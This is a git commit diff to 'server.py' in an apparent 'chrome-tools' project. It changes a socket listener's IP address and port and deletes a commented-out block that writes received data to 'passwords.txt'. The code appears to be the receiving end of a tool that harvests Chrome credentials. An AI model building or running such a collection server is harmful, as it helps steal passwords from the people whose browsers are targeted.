42437410e59c32e14ab0a8306a6c89bd9fc64cdb
Frankfx9 <157478220+Frankfx9@users.noreply.github.com>
2024-11-13 18:37:40 +0100

    Update server.py

--- chrome-tools/chrome/server.py
+++ chrome-tools/chrome/server.py
@@ -1,7 +1,7 @@
 import socket
 
-IP_ADDRESS = "172.29.138.13"
-PORT = 9001
+IP_ADDRESS = "192.168.0.23"
+PORT = 1234
 
 print("Creating Socket...")
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -18,14 +18,4 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             break
         print("Connection completed and closed!!")
 
-# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-#     s.bind((IP_ADDRESS, PORT))
-#     print(f"Listening for connection on {IP_ADDRESS}:{PORT}...")
-#     s.listen(1)
-#     conn, addr = s.accept()
-#     print(f"Connection received from {addr}")
-#     with conn:
-#         received_data = conn.recv(1024).decode()
-#         with open("passwords.txt", 'a') as f:
-#             f.write(received_data + "\n")
-#     print("Connection completed and closed!")
+
